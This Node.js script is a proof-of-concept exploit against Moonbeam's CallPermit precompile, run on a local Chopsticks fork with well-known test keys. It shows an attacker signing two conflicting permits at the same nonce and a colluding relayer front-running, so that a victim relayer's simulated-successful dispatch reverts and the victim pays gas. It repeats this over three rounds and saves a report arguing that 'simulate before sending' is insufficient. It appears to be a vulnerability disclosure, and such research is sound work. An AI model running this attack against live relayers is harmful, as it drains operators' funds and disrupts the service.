"use strict";
const { ApiPromise, WsProvider } = require("@polkadot/api");
const { ethers } = require("ethers");
const fs = require("fs");

const WS = process.env.CHOPSTICKS_WS || "ws://127.0.0.1:8012";

const CALLPERMIT  = "0x000000000000000000000000000000000000080a";
const WGLMR       = "0xAcc15dC74880C9944775448304B263D191c6077F";
const MARKETPLACE = "0x683724817a7d526d6256Aec0D6f8ddF541b924de";

// Hardhat/Anvil well-known private keys — distinct accounts
const RELAYER_A_PK = "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce036f41c7a0049b1f0f9f2";
const RELAYER_B_PK = "0x6c8759f02b1c63628923e93e8e3e669c65d78b91607b2d87086d87c0e2f92655";
const ATTACKER_PK  = "0x59c6995e998f97a5a0044966f094538b85957f5e66ea0d824a528e118d5f43a0";

const FUND = 10n ** 22n; // 10 000 GLMR per account

const CP = new ethers.Interface([
  "function dispatch(address from,address to,uint256 value,bytes data,uint64 gaslimit,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
  "function nonces(address owner) view returns(uint256)",
]);
const WGLMR_ABI = new ethers.Interface([
  "function approve(address spender,uint256 amount) returns(bool)",
  "function allowance(address owner,address spender) view returns(uint256)",
]);

const DOMAIN = {
  name: "Call Permit Precompile",
  version: "1",
  chainId: 1284,
  verifyingContract: CALLPERMIT,
};
const TYPES = {
  CallPermit: [
    { name: "from",     type: "address" },
    { name: "to",       type: "address" },
    { name: "value",    type: "uint256" },
    { name: "data",     type: "bytes"   },
    { name: "gaslimit", type: "uint64"  },
    { name: "nonce",    type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
};

function rawLegacyV(raw) {
  return BigInt(ethers.decodeRlp(raw)[6]).toString();
}
function decodeRevert(hex) {
  if (!hex || hex === "0x") return "";
  if (hex.startsWith("0x08c379a0")) {
    try {
      return ethers.AbiCoder.defaultAbiCoder().decode(["string"], "0x" + hex.slice(10 + 64))[0];
    } catch (_) { return hex; }
  }
  return hex;
}
function isSucceed(exitReason) {
  return JSON.stringify(exitReason ?? "").toLowerCase().includes("succeed");
}

async function accountBasic(api, addr) {
  const j = (await api.call.ethereumRuntimeRPCApi.accountBasic(addr)).toJSON();
  return { balance: BigInt(j.balance), nonce: BigInt(j.nonce) };
}

async function fund(wsProvider, addr, amount = FUND) {
  await wsProvider.send("dev_setStorage", [{
    System: {
      Account: [[[addr], {
        nonce: 0, consumers: 0, providers: 1, sufficients: 0,
        data: { free: amount.toString(), reserved: 0, frozen: 0, flags: 0 },
      }]],
    },
  }]);
}

async function sendLegacy(api, wallet, to, data, gasLimit = 300000n) {
  const { nonce } = await accountBasic(api, wallet.address);
  const raw = await wallet.signTransaction({
    to, data, nonce, gasPrice: 125000000000n, gasLimit, value: 0n, chainId: 1284, type: 0,
  });
  const p = ethers.Transaction.from(raw);
  const ethTx = {
    Legacy: {
      nonce: p.nonce,
      gasPrice: p.gasPrice.toString(),
      gasLimit: p.gasLimit.toString(),
      action: { Call: p.to },
      value: p.value.toString(),
      input: p.data,
      signature: { v: rawLegacyV(raw), r: p.signature.r, s: p.signature.s },
    },
  };

  const events = [];
  await new Promise((resolve, reject) => {
    let unsub;
    api.tx.ethereum.transact(ethTx).send(result => {
      if (result.dispatchError) return reject(new Error(result.dispatchError.toString()));
      if (result.status.isInBlock || result.status.isFinalized) {
        for (const { event } of result.events)
          events.push({ section: event.section, method: event.method, human: event.toHuman() });
        resolve();
        if (unsub) unsub();
      }
    }).then(u => { unsub = u; }).catch(reject);
  });

  const executed = events.filter(e => e.section === "ethereum" && e.method === "Executed");
  const exitReason  = executed[0]?.human?.data?.exitReason ?? null;
  const extraData   = executed[0]?.human?.data?.extraData ?? null;
  return {
    hash: ethers.keccak256(raw),
    exitReason,
    revertMsg: decodeRevert(extraData),
    gasLimit,
  };
}

async function evmCall(api, from, to, calldata) {
  const r = (await api.call.ethereumRuntimeRPCApi.call(
    from, to, calldata, 0n, 1000000, null, null, null, false, null, null,
  )).toJSON();
  return r.ok ?? null;
}

async function getPermitNonce(api, addr) {
  const r = await evmCall(api, ethers.ZeroAddress, CALLPERMIT, CP.encodeFunctionData("nonces", [addr]));
  return r ? CP.decodeFunctionResult("nonces", r.value)[0] : null;
}

async function getAllowance(api, owner, spender) {
  const r = await evmCall(api, ethers.ZeroAddress, WGLMR, WGLMR_ABI.encodeFunctionData("allowance", [owner, spender]));
  return r ? WGLMR_ABI.decodeFunctionResult("allowance", r.value)[0] : null;
}

// Off-chain signing only — zero gas for attacker
async function signPermit(signer, calldata, nonce, deadline) {
  const msg = {
    from: signer.address,
    to: WGLMR,
    value: 0n,
    data: calldata,
    gaslimit: 200000n,
    nonce,
    deadline,
  };
  const sig = ethers.Signature.from(await signer.signTypedData(DOMAIN, TYPES, msg));
  return CP.encodeFunctionData("dispatch", [
    msg.from, msg.to, msg.value, msg.data, msg.gaslimit, msg.deadline, sig.v, sig.r, sig.s,
  ]);
}

// Simulate dispatch as relayerA would — runs at current head (pre-PermitB)
async function simulate(api, from, dispatchCalldata) {
  const r = (await api.call.ethereumRuntimeRPCApi.call(
    from, CALLPERMIT, dispatchCalldata, 0n, 500000, null, null, null, false, null, null,
  )).toJSON();
  if (!r.ok) return { success: false, reason: "substrate_error" };
  return { success: isSucceed(r.ok.exitReason), exitReason: r.ok.exitReason };
}

async function main() {
  const wsProvider = new WsProvider(WS);
  const api = await ApiPromise.create({ provider: wsProvider, noInitWarn: true });

  const relayerA = new ethers.Wallet(RELAYER_A_PK);
  const relayerB = new ethers.Wallet(RELAYER_B_PK);
  const attacker  = new ethers.Wallet(ATTACKER_PK);

  const accounts = [relayerA, relayerB, attacker].map(w => w.address.toLowerCase());
  if (new Set(accounts).size !== accounts.length) throw new Error("accounts must be distinct");

  console.log("=== Zero-Cost DoS on CallPermit Relayers ===\n");
  console.log("RelayerA:", relayerA.address, "(victim — loses gas)");
  console.log("RelayerB:", relayerB.address, "(colluder — front-runs with PermitB)");
  console.log("Attacker:", attacker.address, "(pays 0 gas throughout)");

  for (const w of [relayerA, relayerB, attacker]) await fund(wsProvider, w.address);

  const DEADLINE    = 9999999999n;
  const approveMax  = WGLMR_ABI.encodeFunctionData("approve", [MARKETPLACE, ethers.MaxUint256]);
  const approveZero = WGLMR_ABI.encodeFunctionData("approve", [MARKETPLACE, 0n]);

  const rounds = [];
  let totalRelayerALossWei = 0n;

  for (let round = 1; round <= 3; round++) {
    console.log(`\n--- Round ${round} ---`);

    const nonceBefore = await getPermitNonce(api, attacker.address);
    console.log("Attacker CallPermit nonce:", nonceBefore.toString());

    // STEP 1 — Attacker signs two conflicting permits at the same nonce.
    // Both are cryptographically valid; only one can succeed.
    // This is purely off-chain — attacker pays 0 gas.
    const calldataA = await signPermit(attacker, approveMax,  nonceBefore, DEADLINE);
    const calldataB = await signPermit(attacker, approveZero, nonceBefore, DEADLINE);
    console.log(`PermitA: approve(marketplace, MAX)  nonce=${nonceBefore} → RelayerA`);
    console.log(`PermitB: approve(marketplace, 0)    nonce=${nonceBefore} → RelayerB`);
    console.log("Attacker gas spent: 0 GLMR");

    // STEP 2 — RelayerA simulates PermitA.
    // At this point nonce=N is unconsumed, so simulation returns SUCCESS.
    // RelayerA sees SUCCESS and decides to dispatch.
    const sim = await simulate(api, relayerA.address, calldataA);
    console.log("RelayerA simulation:", sim.success ? "SUCCESS ✅ → decides to dispatch" : `FAIL ❌ (${JSON.stringify(sim.exitReason)})`);

    if (!sim.success) {
      console.log("Unexpected simulation failure — skip round");
      rounds.push({ round, simulationResult: "FAIL", note: "unexpected sim failure" });
      continue;
    }

    // STEP 3 — RelayerA records balance before its dispatch attempt.
    const balBefore = await accountBasic(api, relayerA.address);

    // STEP 4 — RelayerB front-runs: dispatches PermitB first.
    // In the mempool this is achieved with higher gasPrice.
    // On Chopsticks it is achieved by sequencing PermitB into an earlier block.
    const txB = await sendLegacy(api, relayerB, CALLPERMIT, calldataB);
    const allowanceAfterB = await getAllowance(api, attacker.address, MARKETPLACE);
    const nonceAfterB     = await getPermitNonce(api, attacker.address);
    console.log("RelayerB PermitB exit:", JSON.stringify(txB.exitReason));
    console.log("Allowance after PermitB:", allowanceAfterB.toString(), "(should be 0)");
    console.log("Nonce after PermitB:", nonceAfterB.toString(), "(should be", (nonceBefore + 1n).toString() + ")");

    if (!isSucceed(txB.exitReason)) {
      console.log("PermitB failed unexpectedly — skip round");
      rounds.push({ round, simulationResult: "SUCCESS", permitBFailed: true, note: "PermitB failed" });
      continue;
    }

    // STEP 5 — RelayerA dispatches PermitA.
    // Nonce N is already consumed by PermitB → dispatch() reverts → relayerA pays gas for nothing.
    const txA    = await sendLegacy(api, relayerA, CALLPERMIT, calldataA);
    const balAfter    = await accountBasic(api, relayerA.address);
    const nonceAfterA = await getPermitNonce(api, attacker.address);

    const permitAFailed = !isSucceed(txA.exitReason);
    const glmrLostWei   = balBefore.balance - balAfter.balance;
    totalRelayerALossWei += glmrLostWei;

    console.log("RelayerA PermitA exit:", JSON.stringify(txA.exitReason));
    if (txA.revertMsg) console.log("RelayerA PermitA revert:", txA.revertMsg);
    console.log("RelayerA balance lost:", ethers.formatEther(glmrLostWei), "GLMR");
    console.log("Nonce unchanged:", nonceAfterA === nonceAfterB ? "YES (nonce stays at B's value)" : "NO");
    console.log("Simulation SUCCESS → real tx FAIL:", permitAFailed ? "✅ PROVEN" : "❌ not proven this round");

    rounds.push({
      round,
      attackerNonce:          nonceBefore.toString(),
      attackerGasSpent:       "0 GLMR",
      simulationResult:       "SUCCESS",
      simulationExitReason:   sim.exitReason,
      permitBExit:            txB.exitReason,
      allowanceAfterPermitB:  allowanceAfterB.toString(),
      nonceAfterPermitB:      nonceAfterB.toString(),
      permitAExit:            txA.exitReason,
      permitARevert:          txA.revertMsg || null,
      permitAFailed,
      relayerAGlmrLost:       ethers.formatEther(glmrLostWei) + " GLMR",
    });
  }

  const dosRounds = rounds.filter(r => r.simulationResult === "SUCCESS" && r.permitAFailed);

  console.log("\n=== FINAL REPORT ===");
  console.log("Total rounds:                  ", rounds.length);
  console.log("DoS proven (sim✅ + real❌):   ", dosRounds.length, "of", rounds.length);
  console.log("Total RelayerA loss:           ", ethers.formatEther(totalRelayerALossWei), "GLMR");
  console.log("Attacker total gas:             0 GLMR");

  const report = {
    title: "Zero-Cost DoS Attack on CallPermit Relayers via Dual-Nonce Race",
    claim_being_refuted: "Moonbeam: 'relayers should simulate transactions before submission'",
    attack_mechanism: [
      "Attacker signs PermitA (approve MAX, nonce N) — off-chain, 0 gas — hands to RelayerA",
      "Attacker signs PermitB (approve 0,   nonce N) — off-chain, 0 gas — hands to RelayerB",
      "RelayerA simulates PermitA at current head → SUCCESS (nonce N still unconsumed)",
      "RelayerB front-runs: dispatches PermitB → nonce N consumed, allowance set to 0",
      "RelayerA dispatches PermitA → nonce N already consumed → dispatch() reverts",
      "RelayerA loses gas. Attacker paid 0. Repeat with nonce N+1 indefinitely.",
    ],
    why_simulation_fails_as_mitigation: [
      "Simulation and inclusion are not atomic — a race window always exists",
      "Attacker can sign multiple valid permits at the same nonce for free",
      "CallPermit nonce rollback means failed permits remain reusable for replay (separate issue)",
      "Relayer cannot distinguish a 'legitimate' permit from a deliberately doomed one",
    ],
    network: "Moonbeam chainId 1284, Chopsticks fork",
    rounds,
    summary: {
      totalRounds:          rounds.length,
      dosRoundsProven:      dosRounds.length,
      totalRelayerALoss:    ethers.formatEther(totalRelayerALossWei) + " GLMR",
      attackerCost:         "0 GLMR",
      repeatable:           dosRounds.length === rounds.length && rounds.length > 0,
      requiresAttackerFunds: false,
    },
    conclusion: dosRounds.length > 0
      ? "Moonbeam's 'simulate before sending' mitigation is provably insufficient. " +
        "An attacker signs two conflicting permits at the same nonce — zero gas cost. " +
        "Simulation passes because the sabotage permit has not yet been dispatched. " +
        "State changes between simulation and inclusion; this race window is inherent to blockchains. " +
        "Attack repeats indefinitely; each new round requires only one new off-chain signature pair."
      : "DoS not confirmed this run — check Chopsticks connection and fork state.",
  };

  const outPath = "zero_cost_dos_proof.json";
  fs.writeFileSync(outPath, JSON.stringify(report, null, 2));
  console.log("\nSaved:", outPath);

  if (dosRounds.length > 0) {
    console.log("\n\x1b[31mPROOF COMPLETE:\x1b[0m");
    console.log("   ✅ RelayerA simulation: SUCCESS (nonce N unconsumed at sim time)");
    console.log("   ✅ RelayerA real tx:    FAIL   (nonce N consumed by PermitB)");
    console.log("   ✅ Attacker gas:        0 GLMR");
    console.log("   ✅ Repeatable:         ", rounds.length, "of", rounds.length, "rounds");
    console.log("\n→ 'Simulate before sending' is NOT sufficient mitigation.");
  } else {
    console.log("\n⚠️  No rounds confirmed — check Chopsticks state.");
    process.exitCode = 1;
  }

  await wsProvider.disconnect();
}

main().catch(e => { console.error("FATAL:", e.message); process.exit(1); });
